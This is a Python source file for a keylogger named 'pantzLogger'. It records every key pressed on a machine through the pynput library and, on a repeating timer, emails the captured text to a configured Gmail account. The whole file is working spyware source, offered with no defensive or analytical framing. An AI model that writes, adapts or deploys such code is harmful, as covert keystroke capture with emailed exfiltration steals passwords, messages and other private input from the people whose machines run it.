#!/usr/bin/env python
import smtplib

import pynput.keyboard
import threading


class PaKey:
    def __init__(self, time_to_report, email, password):
        self.log = "pantzLogger is now on..."
        self.interval = time_to_report
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    # process to catch keystrokes

    def process_key_press(self, key):
        try:

            self.append_to_log(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "

    def reporter(self):
        self.send_report_via_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.reporter)  # timer to count sec and internal call reporter for new
        timer.start()

    def send_report_via_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit

    def start(self):
        # in order to listen keystrokes from the keyboard

        keyboardListener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboardListener:
            self.reporter()
            keyboardListener.join()
